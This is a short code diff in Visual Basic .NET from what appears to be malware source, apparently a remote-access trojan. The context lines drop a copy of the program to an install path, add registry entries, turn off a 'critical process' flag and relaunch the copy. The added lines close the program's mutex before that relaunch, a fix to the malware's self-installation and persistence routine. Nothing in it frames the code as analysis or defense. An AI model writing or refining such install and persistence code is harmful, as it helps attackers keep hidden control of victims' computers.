@@ -12,6 +12,10 @@
                         AddDrop(C_Settings.fullpath)
                         AddReg(C_ID.Privileges)
 
+                        If C_Settings.MTX IsNot Nothing Then
+                            C_Settings.MTX.Close()
+                            C_Settings.MTX = Nothing
+                        End If
                         C_CriticalProcesses.CriticalProcesses_Disable()
                         Diagnostics.Process.Start(C_Settings.fullpath)
                         End
